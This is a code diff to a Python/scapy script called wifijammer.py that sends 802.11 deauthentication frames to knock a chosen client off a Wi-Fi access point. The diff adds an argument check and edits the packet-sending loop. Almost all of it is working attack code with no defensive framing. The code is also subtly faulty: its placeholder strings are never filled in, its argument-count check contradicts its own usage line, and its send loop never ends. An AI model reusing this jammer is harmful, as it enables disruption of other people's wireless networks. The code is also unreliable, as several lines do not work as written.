@@ -16,6 +16,10 @@ parser.add_argument("-p", "--packets", help="number of packets to send", require
 args = parser.parse_args()
 
 
+if(len(sys.argv) != 6):
+    print("Usage: python3 wifijammer.py -i wlan0 -b 00:11:22:33:44:55 -c ff:ff:ff:ff:ff:ff -ch 1 -p 1000")
+    sys.exit(1)
+
 interface = str(args.interface)
 bssid = str(args.bssid)
 client = str(args.client)
@@ -30,10 +34,11 @@ def enable_monitor_mode():
 def deauth_attack():
     os.system('sudo iwconfig wlan0 channel {channel}')
 
-    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
+    packet = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
     time.sleep(1)
     for i in range(packets):
-        scapy.sendp(packet, iface=interface, inter=0.1, loop=1, verbose=0)
+        # interval between packets loop is true verbose is false
+        sendp(packet, iface=interface, inter=0.1, loop=1, verbose=0)
         print("Deauth packet sent to {bssid}")
 
 enable_monitor_mode()
